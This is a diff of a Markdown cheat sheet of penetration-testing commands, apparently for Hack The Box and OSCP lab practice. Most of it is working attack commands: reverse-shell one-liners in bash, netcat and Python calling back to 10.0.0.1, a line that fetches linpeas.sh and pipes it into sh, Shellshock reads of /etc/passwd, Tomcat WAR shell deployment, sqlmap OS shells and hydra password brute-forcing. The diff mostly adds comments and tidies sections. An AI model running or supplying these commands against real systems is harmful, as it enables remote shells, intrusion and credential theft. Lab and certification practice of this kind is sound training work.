@@ -1,9 +1,9 @@
 # Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
 
-> **Last Update**: 08/27/21
+> **Last Update**: 08/31/21
 
-> **Recent Changes**: Additions to SQLMap/RustScan.
+> **Recent Changes**: Changes to privesc notes and highlighting of different uses.
 
 ## RustScan - #rustscan 
 ```bash
@@ -18,8 +18,7 @@ sudo nmap -sU -sV --version-intensity 0 -F -n ${PWD##*/}
 ## Reverse Shell #OneLiners
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
-rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h![id](https://user-images.githubusercontent.com/16761753/131189586-60b218ce-987a-4c47-84c5-609dbedf4d24.png)
-
+rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
@@ -98,13 +97,22 @@ accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 
 ## PrivEsc Linux #PrivEsc #Linux #sudo #ssh 
 ```bash
+#Mainly for CTFs
 sudo -l
-Kernel Exploits
-OS Exploits
-Password reuse (mysql, .bash_history, 000- default.conf...)
+#See Full Hostname (useful if coming in from a low shell)
+cat /proc/version || uname -a
+cat /etc/os-release
+#Check other networks running on the box
+ifconfig
+#Kernel Exploits #OS Exploits #Writable files owned by root that get executed (cronjobs)
+wget http://10.0.0.1/linpeas.sh | sh
+wget http://10.0.0.1/linenum.sh
+#Password reuse (mysql, .bash_history, 000- default.conf...)
+```
+Updating with commands/references.
+```txt
 Known binaries with suid flag and interactive (nmap)
 Custom binaries with suid flag either using other binaries or with command execution
-Writable files owned by root that get executed (cronjobs)
 MySQL as root
 Vulnerable services (chkrootkit, logrotate)
 Writable /etc/passwd
@@ -190,6 +198,8 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/w
 
 ### 21 #FTP  
 ```bash
+#Anonymous logins
+ftp ${PWD##*/}
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${PWD##*/}
 ```
 
@@ -221,6 +231,12 @@ nikto -host http://${PWD##*/} -p 80,8080,1234 -C all -o nikto-all.html
 nikto -h ${PWD##*/} -useproxy http://${PWD##*/}:4444 #squidcd
 ```
 
+#sub-domain #domains
+```bash
+gobuster vhost -u ${PWD##*/} -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+gobuster dns -d ${PWD##*/} -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+```
+
 #SQL
 ```bash
 sqlmap --wizard
@@ -233,12 +249,14 @@ sqlmap -r req --os-shell
 
 #IIS
 ```bash
+#Use with ffuf to bruteforce directors
 msf6 auxiliary(scanner/http/iis_shortname_scanner)
 /opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt
 ```
 
 #WordPress 
 ```bash
+#Can also be used for password sprays
 wpscan --url http://${PWD##*/}/ --enumerate ap,at,tt,cb,dbe,u,m
 ```
 
@@ -248,6 +266,7 @@ cadaver http://${PWD##*/}:8080/webdav/
 ```
 #ShellShock
 ```bash
+#Outdated
 git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H ${PWD##*/}  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H ${PWD##*/} --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
 ```
 
@@ -268,14 +287,14 @@ Tomcat7/Above:
 ```bash
 curl -v -u <USER>:<PASSWORD> -T shell.war 'http://${PWD##*/}:8080/manager/text/deploy?path=/shellh&update=true'
 ```
-
-Then execute the payload
 ```bash
+#Then execute the payload
 curl http://${PWD##*/}:8080/shell/
 ```
 
 #GIT
 ```bash
+#Grab both from GitHub
 ./gitdumper.sh http://${PWD##*/}/.git/ git
 ./extractor.sh git git-extracted
 ```
@@ -480,5 +499,5 @@ hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
 hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
 ```
 
-<img src="https://user-images.githubusercontent.com/16761753/131189628-abde5896-f896-4154-bf24-ea04e099a62a.png" width="20" height="20"> IslandDog - Christopher Soehnlein 2021
+![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
 https://IslandDog.ky
